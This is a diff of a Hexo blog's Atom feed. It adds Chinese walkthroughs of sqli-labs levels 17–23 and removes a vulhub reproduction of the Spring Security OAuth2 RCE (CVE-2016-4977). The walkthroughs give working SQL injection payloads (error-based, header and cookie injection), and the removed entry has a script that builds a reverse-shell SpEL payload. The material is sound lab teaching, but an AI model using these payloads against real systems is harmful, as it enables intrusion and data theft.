@@ -6,7 +6,7 @@
   <link href="https://hzktester.top/atom.xml" rel="self"/>
   
   <link href="https://hzktester.top/"/>
-  <updated>2020-10-19T13:01:39.276Z</updated>
+  <updated>2020-10-20T07:49:45.074Z</updated>
   <id>https://hzktester.top/</id>
   
   <author>
@@ -15,6 +15,140 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>sqli-labs靶场Less23（过滤了注释符的绕过）</title>
+    <link href="https://hzktester.top/2020/10/20/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess23%EF%BC%88%E8%BF%87%E6%BB%A4%E4%BA%86%E6%B3%A8%E9%87%8A%E7%AC%A6%E7%9A%84%E7%BB%95%E8%BF%87%EF%BC%89/"/>
+    <id>https://hzktester.top/2020/10/20/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess23%EF%BC%88%E8%BF%87%E6%BB%A4%E4%BA%86%E6%B3%A8%E9%87%8A%E7%AC%A6%E7%9A%84%E7%BB%95%E8%BF%87%EF%BC%89/</id>
+    <published>2020-10-20T07:48:00.000Z</published>
+    <updated>2020-10-20T07:49:45.074Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Less23"><a href="#Less23" class="headerlink" title="Less23"></a>Less23</h2><p>本关对<code>id</code>参数过滤了<code>#</code>和<code>--</code>的处理。但是还可以使用闭合的方式来注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,@@datadir,&#39;3</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020102009.png" alt="image"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;Less23&quot;&gt;&lt;a href=&quot;#Less23&quot; class=&quot;headerlink&quot; title=&quot;Less23&quot;&gt;&lt;/a&gt;Less23&lt;/h2&gt;&lt;p&gt;本关对&lt;code&gt;id&lt;/code&gt;参数过滤了&lt;code&gt;#&lt;/code&gt;和&lt;code&gt;--&lt;/code&gt;的处理。但是还可以使用闭合的方式来注入&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;?id&amp;#x3D;-1&amp;#39; union select 1,@@datadir,&amp;#39;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020102009.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
+</summary>
+    
+    
+    
+    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
+    
+    
+    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>sqli-labs靶场Less20、21、22(cookie注入)</title>
+    <link href="https://hzktester.top/2020/10/20/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess20%E3%80%8121%E3%80%8122(cookie%E6%B3%A8%E5%85%A5)/"/>
+    <id>https://hzktester.top/2020/10/20/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess20%E3%80%8121%E3%80%8122(cookie%E6%B3%A8%E5%85%A5)/</id>
+    <published>2020-10-20T06:59:00.000Z</published>
+    <updated>2020-10-20T06:59:56.420Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Less20"><a href="#Less20" class="headerlink" title="Less20"></a>Less20</h2><p>从源代码中我们可以看到 <code>cookie</code> 从 <code>username</code> 中获得值后，当再次刷新时，会从 <code>cookie</code> 中读<br>取 <code>username</code>，然后进行查询。<br>登录成功后，我们修改 <code>cookie</code>，再次刷新时，这时候 <code>sql</code> 语句就会被修改了</p><p>先使用正确的账号密码登录一次。使用burp抓取第二个数据包。修改<code>cookie</code>的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020102006.png" alt="image"></p><h2 id="Less21"><a href="#Less21" class="headerlink" title="Less21"></a>Less21</h2><p>与Less20处理流程一样，但是对cookie进行了<code>base64</code>加密。利用Less20的方法，但是需要将<code>payload</code>进行<code>base64</code>编码处理（这里对uname进行了<code>(&#39;uname&#39;)</code>处理）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4nKWFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IEBAYmFzZWRpciksMHg3ZSkpIw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020102007.png" alt="image"></p><h2 id="Less22"><a href="#Less22" class="headerlink" title="Less22"></a>Less22</h2><p>本关和Less20、Less21是一致的，但是<code>uname</code>进行了<code>&quot;uname&quot;</code>的处理<br>构造<code>payload</code>:<code>admin&quot;and extractvalue(1,concat(0x7e,(select database()),0x7e))#</code></p><p><code>payload</code>进行<code>base64</code>编码后，修改<code>cookie</code>再进行提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4iYW5kIGV4dHJhY3R2YWx1ZSgxLGNvbmNhdCgweDdlLChzZWxlY3QgZGF0YWJhc2UoKSksMHg3ZSkpIw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020102008.png" alt="image"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;Less20&quot;&gt;&lt;a href=&quot;#Less20&quot; class=&quot;headerlink&quot; title=&quot;Less20&quot;&gt;&lt;/a&gt;Less20&lt;/h2&gt;&lt;p&gt;从源代码中我们可以看到 &lt;code&gt;cookie&lt;/code&gt; 从 &lt;code&gt;username&lt;/code&gt; 中获得值后，当再次刷新时，会从 &lt;code&gt;cookie&lt;/code&gt; 中读&lt;br&gt;取 &lt;code&gt;username&lt;/code&gt;，然后进行查询。&lt;br&gt;登录成功后，我们修改 &lt;code&gt;cookie&lt;/code&gt;，再次刷新时，这时候 &lt;code&gt;sql&lt;/code&gt; 语句就会被修改了&lt;/p&gt;
+&lt;p&gt;先使用正确的账号密码登录一次。使用burp抓取第二个数据包。修改&lt;code&gt;cookie&lt;/code&gt;的值&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#39; and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020102006.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;Less21&quot;&gt;&lt;a href=&quot;#Less21&quot; class=&quot;headerlink&quot; title=&quot;Less21&quot;&gt;&lt;/a&gt;Less21&lt;/h2&gt;&lt;p&gt;与Less20处理流程一样，但是对cookie进行了&lt;code&gt;base64&lt;/code&gt;加密。利用Less20的方法，但是需要将&lt;code&gt;payload&lt;/code&gt;进行&lt;code&gt;base64&lt;/code&gt;编码处理（这里对uname进行了&lt;code&gt;(&amp;#39;uname&amp;#39;)&lt;/code&gt;处理）&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;YWRtaW4nKWFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IEBAYmFzZWRpciksMHg3ZSkpIw&amp;#x3D;&amp;#x3D;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020102007.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;Less22&quot;&gt;&lt;a href=&quot;#Less22&quot; class=&quot;headerlink&quot; title=&quot;Less22&quot;&gt;&lt;/a&gt;Less22&lt;/h2&gt;</summary>
+    
+    
+    
+    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
+    
+    
+    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>sqli-labs靶场Less-19(referer注入)</title>
+    <link href="https://hzktester.top/2020/10/20/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess19(referer%E6%B3%A8%E5%85%A5)/"/>
+    <id>https://hzktester.top/2020/10/20/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess19(referer%E6%B3%A8%E5%85%A5)/</id>
+    <published>2020-10-20T06:34:00.000Z</published>
+    <updated>2020-10-20T06:34:49.445Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Less19"><a href="#Less19" class="headerlink" title="Less19"></a>Less19</h2><p>本关和Less18基本是一致的，只不过是<code>referer</code>处存在注入</p><p>使用burp抓包修改<code>referer</code></p><p><img src="https://qiniu.hzktester.top/tp2020102005.png" alt="image"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;Less19&quot;&gt;&lt;a href=&quot;#Less19&quot; class=&quot;headerlink&quot; title=&quot;Less19&quot;&gt;&lt;/a&gt;Less19&lt;/h2&gt;&lt;p&gt;本关和Less18基本是一致的，只不过是&lt;code&gt;referer&lt;/code&gt;处存在注入&lt;/p&gt;
+&lt;p&gt;使用burp抓包修改&lt;code&gt;referer&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020102005.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
+</summary>
+    
+    
+    
+    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
+    
+    
+    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>sqli-labs靶场Less-18(useragent注入)</title>
+    <link href="https://hzktester.top/2020/10/20/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess18(useragent%E6%B3%A8%E5%85%A5)/"/>
+    <id>https://hzktester.top/2020/10/20/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess18(useragent%E6%B3%A8%E5%85%A5)/</id>
+    <published>2020-10-20T06:23:00.000Z</published>
+    <updated>2020-10-20T06:24:10.100Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Less18"><a href="#Less18" class="headerlink" title="Less18"></a>Less18</h2><p>本关可以从源码了解到对<code>uname</code>和<code>passwd</code>进行了<code>check_input()</code>函数的处理，所以这里无法注入了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uname &#x3D; check_input($_POST[&#39;uname&#39;]);</span><br><span class="line">$passwd &#x3D; check_input($_POST[&#39;passwd&#39;]);</span><br></pre></td></tr></table></figure><p>但是代码中将<code>useragent</code>和<code>ip</code>插入到数据库中，可以使用<code>useragent</code>进行注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO &#96;security&#96;.&#96;uagents&#96; (&#96;uagent&#96;, &#96;ip_address&#96;, &#96;username&#96;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)</span><br></pre></td></tr></table></figure><p>使用burp抓包修改<code>useragent</code>看看</p><p><img src="https://qiniu.hzktester.top/tp2020102003.png" alt="image"></p><p>修改<code>useragent</code>报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020102004.png" alt="image"></p><p>可以看到已经得到版本号了</p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;Less18&quot;&gt;&lt;a href=&quot;#Less18&quot; class=&quot;headerlink&quot; title=&quot;Less18&quot;&gt;&lt;/a&gt;Less18&lt;/h2&gt;&lt;p&gt;本关可以从源码了解到对&lt;code&gt;uname&lt;/code&gt;和&lt;code&gt;passwd&lt;/code&gt;进行了&lt;code&gt;check_input()&lt;/code&gt;函数的处理，所以这里无法注入了。&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$uname &amp;#x3D; check_input($_POST[&amp;#39;uname&amp;#39;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$passwd &amp;#x3D; check_input($_POST[&amp;#39;passwd&amp;#39;]);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;但是代码中将&lt;code&gt;useragent&lt;/code&gt;和&lt;code&gt;ip&lt;/code&gt;插入到数据库中，可以使用&lt;code&gt;useragent&lt;/code&gt;进行注入&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;INSERT INTO &amp;#96;security&amp;#96;.&amp;#96;uagents&amp;#96; (&amp;#96;uagent&amp;#96;, &amp;#96;ip_address&amp;#96;, &amp;#96;username&amp;#96;) VALUES (&amp;#39;$uagent&amp;#39;, &amp;#39;$IP&amp;#39;, $uname)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;使用burp抓包修改&lt;code&gt;useragent&lt;/code&gt;看看&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020102003.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
+&lt;p&gt;修改&lt;code&gt;useragent&lt;/code&gt;报错注入&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#39; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &amp;#39;1&amp;#39;&amp;#x3D;&amp;#39;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020102004.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
+    
+    
+    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>sqli-labs靶场Less-17(update注入)</title>
+    <link href="https://hzktester.top/2020/10/20/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess17(update%E6%B3%A8%E5%85%A5)/"/>
+    <id>https://hzktester.top/2020/10/20/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess17(update%E6%B3%A8%E5%85%A5)/</id>
+    <published>2020-10-20T03:27:00.000Z</published>
+    <updated>2020-10-20T06:23:10.031Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Less17"><a href="#Less17" class="headerlink" title="Less17"></a>Less17</h2><p>本关可以看到是一个修改密码的过程，利用的是<code>update</code>语句，与再用<code>select</code>时是一样的。</p><p>尝试报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;11&#39;&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p>可以看到<code>sql</code>语句报错</p><p><img src="https://qiniu.hzktester.top/tp2020102001.png" alt="image"></p><p>尝试一下报错注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;11&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020102002.png" alt="image"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;Less17&quot;&gt;&lt;a href=&quot;#Less17&quot; class=&quot;headerlink&quot; title=&quot;Less17&quot;&gt;&lt;/a&gt;Less17&lt;/h2&gt;&lt;p&gt;本关可以看到是一个修改密码的过程，利用的是&lt;code&gt;update&lt;/code&gt;语句，与再用&lt;code&gt;select&lt;/code&gt;时是一样的。&lt;/p&gt;
+&lt;p&gt;尝试报错：&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;uname&amp;#x3D;admin&amp;amp;passwd&amp;#x3D;11&amp;#39;&amp;amp;submit&amp;#x3D;Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;可以看到&lt;code&gt;sql&lt;/code&gt;语句报错&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020102001.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
+&lt;p&gt;尝试一下报错注入：&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;uname&amp;#x3D;admin&amp;amp;passwd&amp;#x3D;11&amp;#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;amp;submit&amp;#x3D;Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020102002.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
+</summary>
+    
+    
+    
+    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
+    
+    
+    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
+    
+  </entry>
   
   <entry>
     <title>linux操作系统加固</title>
@@ -690,141 +824,6 @@
     
     
     <category term="Spring" scheme="https://hzktester.top/tags/Spring/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Spring Security OAuth2 远程命令执行漏洞复现（CVE-2016-4977）</title>
-    <link href="https://hzktester.top/2020/09/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Security%20OAuth2%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2016-4977%EF%BC%89/"/>
-    <id>https://hzktester.top/2020/09/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Security%20OAuth2%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2016-4977%EF%BC%89/</id>
-    <published>2020-09-29T06:53:00.000Z</published>
-    <updated>2020-10-19T13:02:07.797Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Spring Security OAuth2处理认证请求的时候如果使用了whitelabel视图，response_type参数值会被当做Spring SpEL来执行，恶意攻击者通过构造response_type值可以触发远程代码执行漏洞 </p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用vulhub搭建漏洞环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;vulhub&#x2F;spring&#x2F;CVE-2016-4977&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>启动完成后，访问<a href="http://your-ip:8080/%E5%8D%B3%E5%8F%AF%E7%9C%8B%E5%88%B0web%E9%A1%B5%E9%9D%A2%E3%80%82">http://your-ip:8080/即可看到web页面。</a></p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Spring Security OAuth 2.3到2.3.2</p><p>Spring Security OAuth 2.2到2.2.1</p><p>Spring Security OAuth 2.1到2.1.1</p><p>Spring Security OAuth 2.0到2.0.14</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://your-ip:8080/oauth/authorize?response_type=$&#123;233*233&#125;&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</code>。首先需要填写用户名和密码，我们这里填入<code>admin:admin</code>即可。</p><p><img src="https://qiniu.hzktester.top/tp2020092901.png" alt="image"></p><p>对反弹shell的POC进行base64编码<br><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p><p><img src="https://qiniu.hzktester.top/tp2020092902.png" alt="image"></p><p>使用<code>poc.py</code>生成反弹shell的POC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">message &#x3D; input(&#39;Enter message to encode:&#39;)</span><br><span class="line"></span><br><span class="line">poc &#x3D; &#39;$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&#39; % ord(message[0])</span><br><span class="line"></span><br><span class="line">for ch in message[1:]:</span><br><span class="line">   poc +&#x3D; &#39;.concat(T(java.lang.Character).toString(%s))&#39; % ord(ch) </span><br><span class="line"></span><br><span class="line">poc +&#x3D; &#39;)&#125;&#39;</span><br><span class="line"></span><br><span class="line">print(poc)</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020092903.png" alt="image"></p><p>监听反弹shell，并访问URL<code>http://your-ip:8080/oauth/authorize?response_type=上面的那一长串POC&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</code></p><p><img src="https://qiniu.hzktester.top/tp2020092904.png" alt="image"></p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Spring Security OAuth2处理认证请求的时候如果使用了whitelabel视图，response_type参数值会被当做Spring SpEL来执行，恶意攻击者通过构造response_type值可以触发远程代码执行漏洞 &lt;/p&gt;
-&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;p&gt;使用vulhub搭建漏洞环境&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cd &amp;#x2F;vulhub&amp;#x2F;spring&amp;#x2F;CVE-2016-4977&amp;#x2F;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;启动完成后，访问&lt;a href=&quot;http://your-ip:8080/%E5%8D%B3%E5%8F%AF%E7%9C%8B%E5%88%B0web%E9%A1%B5%E9%9D%A2%E3%80%82&quot;&gt;http://your-ip:8080/即可看到web页面。&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Spring Security OAuth 2.3到2.3.2&lt;/p&gt;
-&lt;p&gt;Spring Security OAuth 2.2到2.2.1&lt;/p&gt;
-&lt;p&gt;Spring Security OAuth 2.1到2.1.1&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    
-    
-    <category term="Spring" scheme="https://hzktester.top/tags/Spring/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ThinkPHP 2.x 任意代码执行漏洞复现</title>
-    <link href="https://hzktester.top/2020/09/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%202.x%20%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    <id>https://hzktester.top/2020/09/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%202.x%20%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
-    <published>2020-09-28T01:44:00.000Z</published>
-    <updated>2020-10-19T13:02:14.011Z</updated>
-    
